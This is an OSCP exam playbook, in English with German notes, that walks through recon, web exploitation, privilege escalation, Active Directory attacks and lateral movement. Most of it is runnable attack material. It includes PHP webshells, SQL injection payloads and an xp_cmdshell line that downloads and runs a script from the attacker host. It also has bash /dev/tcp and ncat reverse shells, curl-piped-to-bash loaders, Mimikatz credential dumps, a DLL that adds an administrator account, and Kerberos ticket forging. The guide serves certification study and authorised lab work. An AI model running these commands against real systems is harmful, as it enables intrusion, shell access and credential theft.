# OSCP Playbook v2

---

## Phase 0: Setup

### Environment Variables

```bash
export IP=10.10.10.x
export LHOST=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
export LPORT=443
```

### Add to /etc/hosts

```bash
echo "$IP <domain>" | sudo tee -a /etc/hosts
```

### Recon System Setup (Kali)

```bash
# Einmalig: Repo klonen
git clone https://github.com/ma4imus237/recon-system.git

# Optional: PDF-Report-Support
pip install xhtml2pdf
```

### Start Listeners

```bash
# Netcat
rlwrap nc -lvnp $LPORT

# Python HTTP server (file transfer)
python3 -m http.server 1337

# SMB server (file transfer to Windows)
impacket-smbserver smbfolder $(pwd) -smb2support -user kali -password kali
```

---

## Phase 1: Reconnaissance

### 1.0 Automated Recon (Recon System)

> Automatisiert Phase 1 komplett: Port Scan, OS-Erkennung, Service-Enumeration, Web-Analyse, Credential-Discovery und Report-Generierung. Danach weiter mit Phase 2.
>
> **Kein `sudo` noetig!** Das Script ruft intern `sudo` nur fuer nmap SYN/UDP-Scans auf und setzt die File-Ownership danach automatisch zurueck. Alle Output-Dateien gehoeren dem aufrufenden User.

#### One-Shot (empfohlen)

```bash
# Standard Recon (interaktiv — fragt bei optionalen Scans)
python3 recon_system.py -t $IP

# Batch Mode (non-interactive, default wordlists)
python3 recon_system.py -t $IP --batch

# Full Scan (grosse Wordlists, UDP Top 100, VHost, Nikto, feroxbuster, alle Web-Ports)
python3 recon_system.py -t $IP --full --batch

# Mit Domain (fuer DNS Zone Transfer, VHost Enum)
python3 recon_system.py -t $IP -d <domain> --full --batch

# Debug-Logging (alle stderr, command durations im Log)
python3 recon_system.py -t $IP --full --batch --log-level debug
```

#### Einzelne Module (nach Initial Scan, mit --resume)

```bash
# Nur Port Scanning
python3 recon_system.py --resume $IP -m initial --batch

# Linux Services (SSH, FTP, NFS, SMTP, DNS, MySQL, Redis, PostgreSQL, MongoDB)
python3 recon_system.py --resume $IP -m linux --batch

# Windows Services (SMB, RPC, WinRM, MSSQL, RDP)
python3 recon_system.py --resume $IP -m windows --batch

# Web Enumeration (Gobuster, WhatWeb, Forms, CMS-Detection, Nikto)
python3 recon_system.py --resume $IP -m web --batch

# Web mit Full Scan (feroxbuster, VHost, grosse Wordlists)
python3 recon_system.py --resume $IP -m web --full --batch

# Non-Standard Services (SNMP, Docker, Elasticsearch, etc.)
python3 recon_system.py --resume $IP -m services --batch

# Post-Exploitation (nach Shell-Zugang)
python3 recon_system.py --resume $IP -m post_exploit -u user --password 'pass' --shell-type ssh --batch
python3 recon_system.py --resume $IP -m post_exploit -u user --password 'pass' --shell-type winrm --batch

# Report neu generieren (nach weiteren Scans)
python3 recon_system.py --resume $IP -m report --batch
```

#### AD Recon (Domain Controller + Member Servers)

```bash
# Vollstaendiger AD Workflow (alle Phasen)
python3 ad_system.py --dc $IP --domain <domain> --batch

# Full AD Scan mit Credentials
python3 ad_system.py --dc $IP --domain <domain> -u user --password 'Pass123' --full --batch

# Multi-Target (DC + Member Servers)
python3 ad_system.py --dc $IP --domain <domain> --targets 10.10.10.2,10.10.10.3 --full --batch

# Einzelne AD Module
python3 ad_system.py --dc $IP --domain <domain> -m enum --batch         # Anonymous LDAP + RPC
python3 ad_system.py --dc $IP --domain <domain> -m users --batch        # Kerbrute User Enum
python3 ad_system.py --dc $IP --domain <domain> -m asrep --batch        # AS-REP Roasting
python3 ad_system.py --dc $IP --domain <domain> -m kerberoast -u user --password 'Pass' --batch
python3 ad_system.py --dc $IP --domain <domain> -m bloodhound -u user --password 'Pass' --batch
python3 ad_system.py --dc $IP --domain <domain> -m spray --password 'Password1' --batch

# Session fortsetzen
python3 ad_system.py --resume <ad_dir> -m kerberoast -u user --password 'Pass' --batch
```

#### Output & Reports

```bash
# Reports liegen in: $IP/report/
#   report.md     — Markdown (Hauptformat, mit Exploit-Playbook)
#   report.html   — Interaktives Dark-Theme HTML
#   report.pdf    — Druckbares PDF (Light Theme)
#   summary.json  — Maschinen-lesbare Stats

# Session-Log (alle Commands, Fehler, Durations)
cat $IP/recon.log

# Session-Daten (Ports, Findings, Credentials)
cat $IP/session.json
```

---

### 1.1 Port Scanning

> **Recon System:** `python3 recon_system.py --resume $IP -m initial --batch` macht Quick TCP + Full TCP + optionalen UDP Scan automatisch.

#### Port Scan

```bash
nmap $IP -sV -Pn
```

#### Service/Version Scan (on open ports)

```bash
nmap -p 22,80,443 -sC -sV -oN services.txt $IP
```

#### Top 100 UDP

```bash
sudo nmap -sU --top-ports 100 --min-rate 5000 -oN udp.txt $IP
```

#### Through Proxy (internal network)

```bash
proxychains nmap -sT --top-ports=100 -Pn $IP
```

#### Windows Port Scan (from compromised host)

```powershell
Test-NetConnection -Port 445 $IP
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("$IP", $_)) "TCP port $_ is open"} 2>$null
```

### 1.2 Service-Specific Enumeration

> **Recon System:** Die Module `linux`, `windows`, `web`, `services` decken die folgenden Abschnitte automatisch ab. Manuelle Commands sind fuer gezielte Nacharbeit.

#### HTTP/HTTPS

> **Recon System:** `python3 recon_system.py --resume $IP -m web --batch` (mit `--full` fuer feroxbuster + VHost + Nikto)

##### Tech Stack Identification

```bash
# Wappalyzer (browser extension) or:
whatweb http://$IP
curl -s -I http://$IP
```

##### Directory Fuzzing

```bash
# feroxbuster — Extensions je nach Tech-Stack anpassen:

# Linux + PHP (häufigster OSCP-Fall)
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak -o scans/ferox.txt

# Windows / IIS
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,aspx,html,txt -o scans/ferox.txt

# Node.js / JavaScript-Backend
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x js,json,html,txt -o scans/ferox.txt

# gobuster — gleiche Logik für Extensions
gobuster dir -t 20 -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak -o scans/gobuster.txt

# ffuf
ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404 -o scans/ffuf.json
```

##### VHost / Subdomain Fuzzing

```bash
# ffuf
ffuf -u http://$IP -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fc 301,302 --fs <default_size>

# gobuster
gobuster vhost -u http://<domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --exclude-length <default_length>
```

##### Parameter Fuzzing

```bash
wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://$IP/page?FUZZ=test" --hc 404 --hh <default_size>
ffuf -u "http://$IP/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fc 404
```

##### WordPress

```bash
wpscan --url http://$IP -e ap,at,tt,vp --api-token <TOKEN>
wpscan --url http://$IP --enumerate vp --plugins-detection aggressive
```

##### API Endpoint Discovery

```bash
# Kiterunner
kiterunner scan http://$IP/api/ -w routes-small.kite -x 20

# ffuf
ffuf -u http://$IP/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt
```

#### SMB (TCP 139, 445)

> **Recon System:** `python3 recon_system.py --resume $IP -m windows --batch` (SMB Shares, Null Session, RID Cycling, MS17-010, Signing)

```bash
# Null session / anonymous
smbmap -H $IP
smbclient -N -L //$IP
crackmapexec smb $IP -u '' -p '' --shares

# With credentials
smbclient //$IP/share -U 'domain/user%password'
smbmap -H $IP -u user -p password -d domain
crackmapexec smb $IP -u user -p password --shares

# Download entire share
smbget -a -R smb://$IP/share

# Crawl all files
crackmapexec smb $IP -u '' -p '' -M spider_plus

# With NTLM hash
crackmapexec smb $IP -u user -H <hash> --shares
smbclient //$IP/share -U user --pw-nt-hash <hash> -W domain
```

#### FTP (TCP 21)

> **Recon System:** Automatisch via `-m linux` (Anonymous Check, Banner, vsftpd/ProFTPD Backdoor Detection)

```bash
# Anonymous login
ftp $IP
# user: anonymous, pass: (blank or email)

# Nmap scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor $IP
```

#### SNMP (UDP 161)

> **Recon System:** Automatisch via `-m services` (Community String Brute, SNMP Walk, User/Process Extraction)

```bash
# Community string bruteforce
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP

# Full walk
snmpbulkwalk -c public -v2c $IP > scans/snmpwalk.txt

# Extended objects (command output)
snmpwalk -v1 -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects

# Useful OIDs
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2  # Installed software
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25    # User accounts
```

#### DNS (TCP/UDP 53)

> **Recon System:** Automatisch via `-m linux` (Zone Transfer, DNS Enum Scripts)

```bash
# Zone transfer
dig axfr <domain> @$IP

# Reverse lookup
dig -x $IP @$IP

# Enumerate subdomains
dnsenum --dnsserver $IP --enum <domain>
```

#### LDAP (TCP 389, 636)

> **Recon System:** Automatisch via `python3 ad_system.py -m enum` (Anonymous LDAP, Base DN, User/Group Enum)

```bash
# Base enumeration
ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -x -H ldap://$IP -b "DC=domain,DC=com" "(objectClass=*)"

# With credentials
ldapsearch -x -H ldap://$IP -D 'user@domain.com' -w 'password' -b "DC=domain,DC=com"
```

#### SMTP (TCP 25)

> **Recon System:** Automatisch via `-m linux` (VRFY/EXPN Check, User Enum bei `--full`)

```bash
# User enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP

# Manual
telnet $IP 25
VRFY root
EXPN admin
```

#### RPC / NFS

> **Recon System:** RPC via `-m windows` (Null Session, User Enum), NFS via `-m linux` (showmount, Exports)

```bash
# RPC
rpcclient -U '' -N $IP
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# NFS
showmount -e $IP
mount -t nfs $IP:/share /mnt/nfs
```

### 1.3 Web Application Analysis

> **Recon System:** `-m web` erkennt automatisch: Tech Stack, Directories, Forms/Inputs, CMS, robots.txt, Common Files. Der generierte Report enthaelt ein Exploit-Playbook mit konkreten Befehlen.

#### Default / Weak Credentials

Check for default creds on login pages: `admin:admin`, `admin:password`, `root:root`, `tomcat:s3cret`, etc. Reference: DefaultCreds Cheat Sheet

#### Login Bypass (SQLi)

```
' OR 1=1 --
' OR '1'='1
admin'--
" OR ""="
```

#### Source Code Review

```bash
# View page source for comments, hidden fields, JS files
curl -s http://$IP/ | grep -i "<!--\|password\|user\|hidden\|api\|key\|token"

# Download and review JS
curl -s http://$IP/js/app.js
```

#### LFI / PHP Filters

```bash
# Basic LFI
curl "http://$IP/page?file=../../../etc/passwd"
curl "http://$IP/page?file=....//....//....//etc/passwd"

# PHP wrapper - base64 encode source
curl "http://$IP/page?file=php://filter/convert.base64-encode/resource=index.php"

# PHP data wrapper - RCE
curl "http://$IP/page?file=data://text/plain,<?php system('id'); ?>"

# Log poisoning (after injecting PHP into User-Agent via nc)
curl "http://$IP/page?file=/var/log/apache2/access.log&cmd=id"
```

---

## Phase 2: Initial Access

### 2.1 SQL Injection

#### Error-Based / Union

```sql
-- Determine column count
' ORDER BY 1-- -
' ORDER BY 2-- -
' UNION SELECT NULL,NULL,NULL-- -

-- Extract data
' UNION SELECT 1,user(),database()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,username,password FROM users-- -
```

#### MSSQL - xp_cmdshell

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';

-- Reverse shell
'; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://LHOST:1337/shell.ps1\")"'; --
```

#### sqlmap

```bash
sqlmap -u "http://$IP/page?id=1" --batch --dbs
sqlmap -u "http://$IP/page?id=1" -D dbname -T users --dump
sqlmap -u "http://$IP/page?id=1" --os-shell
sqlmap -r request.txt --batch --dbs  # from Burp saved request
```

### 2.2 File Upload / Webshell

#### PHP Webshell

```php
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
```

#### Bypass Techniques

```
# Extension bypass
shell.php -> shell.php5, shell.phtml, shell.pHp, shell.php.jpg, shell.php%00.jpg
shell.aspx -> shell.ashx, shell.asmx, shell.aspx

# Content-Type bypass
Change Content-Type header to: image/jpeg, image/png

# Magic bytes + PHP
GIF89a<?php system($_GET['cmd']); ?>
```

#### ASPX Webshell

```bash
# Use insomnia_shell.aspx or msfvenom:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
```

#### JSP Webshell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shell.jsp
```

### 2.3 LFI / Directory Traversal

```bash
# Linux targets
../../etc/passwd
../../etc/shadow
../../home/user/.ssh/id_rsa
../../var/www/html/config.php
../../proc/self/environ

# Windows targets
..\..\windows\system32\config\sam
..\..\windows\win.ini
..\..\inetpub\wwwroot\web.config
```

### 2.4 SSRF

```bash
# Internal service access
curl "http://$IP/fetch?url=http://127.0.0.1:8080"
curl "http://$IP/fetch?url=http://localhost:3000/admin"

# Cloud metadata
curl "http://$IP/fetch?url=http://169.254.169.254/latest/meta-data/"

# File read
curl "http://$IP/fetch?url=file:///etc/passwd"
```

### 2.5 Command Injection

```bash
# Separators
; id
| id
|| id
& id
&& id
$(id)
`id`

# Blind (out-of-band)
; curl http://$LHOST:1337/$(whoami)
; ping -c 1 $LHOST
```

### 2.6 Known CVEs / searchsploit

```bash
searchsploit <software> <version>
searchsploit -m <exploit_id>   # mirror/copy exploit
searchsploit -x <exploit_id>   # examine exploit

# Update database
searchsploit -u
```

### 2.7 Credential Spraying / Brute Force

```bash
# Hydra - SSH
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP

# Hydra - FTP
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP

# Hydra - HTTP POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -t 20

# Hydra - RDP
hydra -l user -P /usr/share/wordlists/rockyou.txt rdp://$IP

# CrackMapExec - Password Spraying (SMB)
crackmapexec smb $IP -u users.txt -p 'Password1' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm $IP -u users.txt -p passwords.txt --continue-on-success
```

---

## Phase 3: Post-Exploitation

> **Recon System:** Nach Shell-Zugang automatisierte Privesc-Checks und Credential-Harvesting:
> ```bash
> python3 recon_system.py --resume $IP -m post_exploit -u user --password 'pass' --shell-type ssh --batch
> python3 recon_system.py --resume $IP -m post_exploit -u user --password 'pass' --shell-type winrm --batch
> ```

### 3.1 Stabilize Shell

#### Linux

```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 160
```

#### Windows

```powershell
# Launch PowerShell from cmd
powershell -ep bypass

# ConPty shell (if available)
stty raw -echo; (stty size; cat) | nc -lvnp $LPORT
```

### 3.2 Credential Hunting

#### Linux

```bash
# Config files
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | head -30
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/shadow

# SSH keys
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
cat /home/*/.ssh/id_rsa

# History files
cat /home/*/.bash_history
cat /root/.bash_history

# Environment / .env files
env
find / -name ".env" 2>/dev/null

# Database credentials
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "pass\|pwd\|db_" /etc/ 2>/dev/null
```

#### Windows

```powershell
# Saved credentials
cmdkey /list
rundll32 keymgr.dll,KRShowKeyMgr

# PowerShell history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"

# Unattended install files
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml

# Registry passwords
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# KeePass databases
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# WiFi passwords
netsh wlan show profile
netsh wlan show profile name="SSID" key=clear

# Web config
type C:\inetpub\wwwroot\web.config
```

### 3.3 Internal Enumeration

```bash
# Network interfaces & routing
ip a
ip route
arp -a
netstat -tlnp

# Other hosts (ping sweep)
for i in $(seq 1 254); do (ping -c 1 10.10.10.$i | grep "bytes from" &); done
```

```powershell
# Windows
ipconfig /all
route print
arp -a
netstat -ano
```

---

## Phase 4: Privilege Escalation

### 4.1 Linux Privesc Checklist

#### Automated Enumeration

```bash
# LinPEAS
curl http://$LHOST:1337/linpeas.sh | bash | tee linpeas.txt

# LinEnum
curl http://$LHOST:1337/linenum.sh | bash | tee linenum.txt

# pspy (cron/process monitor)
curl http://$LHOST:1337/pspy64 -o pspy64 && chmod +x pspy64 && ./pspy64
```

#### sudo -l

```bash
sudo -l
# Check GTFOBins for each binary listed
# Common: vim, less, more, man, awk, find, nmap, python, perl, ruby, env, ftp
```

#### SUID / SGID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Check GTFOBins for each
```

#### Capabilities

```bash
getcap -r / 2>/dev/null
# Common: python3 cap_setuid, node, perl, php
```

#### Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron*
crontab -l
# Watch for writable scripts called by root cron
```

#### Writable Files / PATH Hijack

```bash
# World-writable directories in PATH
echo $PATH
find / -writable -type d 2>/dev/null

# If a cron job or SUID binary calls a command without full path:
echo '#!/bin/bash' > /tmp/command
echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' >> /tmp/command
chmod +x /tmp/command
export PATH=/tmp:$PATH
```

#### Wildcard Injection (tar)

```bash
# If cron runs: tar -zxf /tmp/backup.tar.gz *
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" > shell.sh
touch -- "--checkpoint-action=exec=sh shell.sh"
touch -- "--checkpoint=1"
```

#### Pager Escape (less/more/man)

```bash
# If running as root via sudo:
!/bin/bash
```

#### Kernel Exploits

```bash
uname -a
cat /etc/os-release
# Search: searchsploit linux kernel <version> privilege escalation
```

#### NFS no_root_squash

```bash
cat /etc/exports
# If no_root_squash: mount, create SUID binary as root, execute on target
```

#### Docker / LXD Group

```bash
id   # check for docker or lxd group
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

#### Write to /etc/passwd

```bash
# Generate password hash
openssl passwd -1 w00t
# Add root user
echo 'root2:$1$...:0:0:root:/root:/bin/bash' >> /etc/passwd
```

### 4.2 Windows Privesc Checklist

#### Automated Enumeration

```powershell
# winPEAS
iwr -uri http://$LHOST:1337/winpeas64.exe -Outfile winpeas64.exe
.\winpeas64.exe

# PrivescCheck
iwr -uri http://$LHOST:1337/privesccheck.ps1 -Outfile privesccheck.ps1
. .\privesccheck.ps1
Invoke-PrivescCheck -Extended -Report "privesccheck_$($env:COMPUTERNAME)"
```

#### Basic Enumeration

```powershell
whoami
whoami /priv
whoami /groups
net user
net localgroup Administrators
systeminfo
```

#### SeImpersonatePrivilege

```powershell
# PrintSpoofer
.\PrintSpoofer64.exe -c "C:\TEMP\ncat.exe $LHOST $LPORT -e cmd"

# GodPotato
.\GodPotato-NET4.exe -cmd "C:\TEMP\ncat.exe $LHOST $LPORT -e cmd"

# JuicyPotatoNG
.\JuicyPotatoNG.exe -t * -p "C:\TEMP\ncat.exe" -a "$LHOST $LPORT -e cmd"
```

#### Service Misconfiguration

```powershell
# Unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\"

# Writable service binary
icacls "C:\path\to\service.exe"
# Replace with malicious binary

# Writable service config (change binary path)
sc config <svc> binpath= "C:\TEMP\shell.exe"
sc stop <svc>
sc start <svc>
```

#### Scheduled Tasks

```powershell
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User"
# Look for tasks running as SYSTEM with writable script paths
```

#### AlwaysInstallElevated

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

#### Mimikatz (requires admin)

```powershell
# Logon passwords
.\mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"

# SAM dump
.\mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# LSA dump (from saved hives)
reg save hklm\sam sam.hiv
reg save hklm\security security.hiv
reg save hklm\system system.hiv
.\mimikatz64.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
```

#### DLL Hijacking

```c
// adduser_dll.c - compile with:
// x86_64-w64-mingw32-gcc adduser_dll.c --shared -o missing.dll
#include <stdlib.h>
#include <windows.h>
BOOL APIENTRY DllMain(HANDLE h, DWORD reason, LPVOID lp) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("net user hacker Password1! /add");
        system("net localgroup administrators hacker /add");
    }
    return TRUE;
}
```

### 4.3 AD-Specific Attacks

> **Recon System (AD):** `ad_system.py` automatisiert den kompletten AD-Workflow: DC Scan, Domain Enum, User Discovery, AS-REP, Kerberoast, BloodHound, Password Spray, Credential Propagation auf Member Servers.

#### AD Recon System (Automated)

```bash
# Kompletter AD Workflow (alle Phasen automatisch)
python3 ad_system.py --dc $IP --domain <domain> --full --batch

# Mit bekannten Credentials
python3 ad_system.py --dc $IP --domain <domain> -u user --password 'Pass123' --full --batch

# Mit Member Servers (Credential Propagation)
python3 ad_system.py --dc $IP --domain <domain> --targets 10.10.10.2,10.10.10.3 -u user --password 'Pass123' --full --batch

# Einzelne Angriffs-Module
python3 ad_system.py --resume <ad_dir> -m asrep --batch                                          # AS-REP (kein Cred noetig)
python3 ad_system.py --resume <ad_dir> -m kerberoast -u user --password 'Pass' --batch            # Kerberoast
python3 ad_system.py --resume <ad_dir> -m bloodhound -u user --password 'Pass' --batch            # BloodHound
python3 ad_system.py --resume <ad_dir> -m spray --password 'Password1' --batch                    # Password Spray
python3 ad_system.py --resume <ad_dir> -m spray --password 'Welcome1' --batch                     # Spray Variante
python3 ad_system.py --resume <ad_dir> -m spray --password '<domain_prefix>1' --batch               # Spray: DomainPrefix+1

# Pass the Hash
python3 ad_system.py --dc $IP --domain <domain> -u Administrator --hash 'aad3b435...:ntlm_hash' --full --batch

# Report ansehen
cat <ad_dir>/recon.log              # Full Command Log
cat <ad_dir>/report/report.md        # Findings + Exploit Playbook
```

#### BloodHound / SharpHound

```powershell
iwr -uri http://$LHOST:1337/SharpHound.exe -Outfile SharpHound.exe
.\SharpHound.exe --CollectionMethods All
```

```bash
# Start neo4j + BloodHound on attacker
sudo neo4j console
bloodhound
# Upload .zip, analyze shortest paths to DA
```

#### Kerberoasting

> **Recon System:** `python3 ad_system.py --resume <ad_dir> -m kerberoast -u user --password 'Pass' --batch`

```bash
# Remote (impacket)
impacket-GetUserSPNs -request -dc-ip $IP domain/user:password
proxychains impacket-GetUserSPNs -request -dc-ip $IP domain/user

# On target (Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Crack
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### AS-REP Roasting

> **Recon System:** `python3 ad_system.py --resume <ad_dir> -m asrep --batch` (kein Credential noetig)

```bash
# Remote
impacket-GetNPUsers -dc-ip $IP -request -outputfile hashes.asrep domain/user
impacket-GetNPUsers -dc-ip $IP -usersfile users.txt -no-pass domain/

# On target
.\Rubeus.exe asreproast /nowrap

# Crack
hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### DCSync

```bash
# Impacket
impacket-secretsdump -just-dc-user Administrator domain/user:"password"@$IP
impacket-secretsdump domain/user:"password"@$IP

# Mimikatz (needs Replicating Directory Changes + All)
lsadump::dcsync /user:domain\Administrator
```

#### GPP Passwords

```bash
# From SYSVOL
smbget -a -R smb://$IP/Replication
# Search for Groups.xml
find . -name "Groups.xml"

# Decrypt cpassword
gpp-decrypt <cpassword_value>
```

#### LAPS

```powershell
# If user has read rights to ms-Mcs-AdmPwd attribute
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select-Object Name, ms-Mcs-AdmPwd
```

```bash
# From Linux
crackmapexec ldap $IP -u user -p password --module laps
```

#### Responder (Net-NTLMv2 Capture)

```bash
# Start responder
sudo responder -I tun0

# Force auth from target (if you have code exec)
dir \\$LHOST\test

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

#### NTLM Relay

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t $IP -c "powershell -enc <BASE64>"
```

---

## Phase 5: Lateral Movement

### 5.1 Tunneling

#### Chisel (SOCKS Proxy)

```bash
# Attacker (server)
./chisel server -p 8000 --reverse

# Target (client)
./chisel client $LHOST:8000 R:socks

# Creates SOCKS5 proxy at 127.0.0.1:1080
# Add to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080
```

#### SSH Tunneling

```bash
# Local port forward (-L): access remote_host:port through SSH server
ssh -N -L 0.0.0.0:LOCAL_PORT:TARGET_IP:TARGET_PORT user@ssh_server

# Dynamic SOCKS proxy (-D): route all traffic through SSH
ssh -N -D 0.0.0.0:9999 user@ssh_server

# Remote port forward (-R): expose target to attacker
ssh -N -R 127.0.0.1:LOCAL_PORT:TARGET_IP:TARGET_PORT kali@$LHOST

# Remote dynamic (-R): SOCKS on attacker side
ssh -N -R 9998 kali@$LHOST
```

#### socat

```bash
# Simple port forward
socat TCP-LISTEN:LOCAL_PORT,fork TCP:TARGET_IP:TARGET_PORT
```

#### Ligolo-ng

```bash
# Attacker (proxy)
./proxy -selfcert -laddr 0.0.0.0:11601

# Target (agent)
./agent -connect $LHOST:11601 -ignore-cert

# In ligolo console: session, ifconfig, start
# Add route on attacker: sudo ip route add 10.10.10.0/24 dev ligolo
```

### 5.2 Pass the Hash / Ticket

#### Pass the Hash

```bash
# PsExec
impacket-psexec -hashes 00000000000000000000000000000000:NTLM_HASH Administrator@$IP

# WMI
impacket-wmiexec -hashes 00000000000000000000000000000000:NTLM_HASH Administrator@$IP

# CrackMapExec
crackmapexec smb $IP -u Administrator -H NTLM_HASH

# evil-winrm
evil-winrm -i $IP -u Administrator -H NTLM_HASH
```

#### Overpass the Hash

```
# Mimikatz
sekurlsa::pth /user:user /domain:domain.com /ntlm:HASH /run:powershell
```

#### Pass the Ticket

```
# Export tickets
sekurlsa::tickets /export

# Inject ticket
kerberos::ptt ticket.kirbi

# Verify
klist
```

#### Silver Ticket

```
kerberos::golden /sid:S-1-5-21-... /domain:domain.com /ptt /target:server.domain.com /service:http /rc4:SERVICE_NTLM_HASH /user:Administrator
```

#### Golden Ticket

```
# Requires krbtgt NTLM hash (from DCSync)
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### 5.3 Remote Execution

#### PsExec

```bash
impacket-psexec domain/user:password@$IP
impacket-psexec -hashes :HASH Administrator@$IP
```

#### WinRM / evil-winrm

```bash
# Password
evil-winrm -i $IP -u user -p password

# Hash
evil-winrm -i $IP -u user -H NTLM_HASH

# Through proxy
proxychains evil-winrm -i $IP -u user -p password
```

#### WMI

```bash
impacket-wmiexec domain/user:password@$IP
```

#### PowerShell Remoting

```powershell
$cred = New-Object System.Management.Automation.PSCredential('domain\user', (ConvertTo-SecureString 'password' -AsPlainText -Force))
New-PSSession -ComputerName $IP -Credential $cred
Enter-PSSession 1
```

#### RDP

```bash
xfreerdp /u:user /p:password /v:$IP /cert:ignore
xfreerdp /u:user /pth:NTLM_HASH /v:$IP /cert:ignore
```

---

## Phase 6: Loot & Proof

> **Recon System:** Report mit allen Findings, Credentials und Exploit-Playbook neu generieren:
> ```bash
> python3 recon_system.py --resume $IP -m report --batch
> # Ergebnis: $IP/report/report.{md,html,pdf}
> ```

### Capture Flags

```bash
# Linux
cat /root/proof.txt
cat /home/*/local.txt
hostname
ip a
whoami
```

```powershell
# Windows
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\*\Desktop\local.txt
hostname
ipconfig
whoami
```

### Screenshot Requirements

- Show `whoami` + `hostname` + `ip a`/`ipconfig` + flag content in same terminal
- Take screenshot immediately after capturing flag

### Hash Cracking Reference

| Hash Type | Hashcat Mode | Example |
|-----------|-------------|---------|
| NTLM | 1000 | `hashcat -m 1000 hash.txt rockyou.txt` |
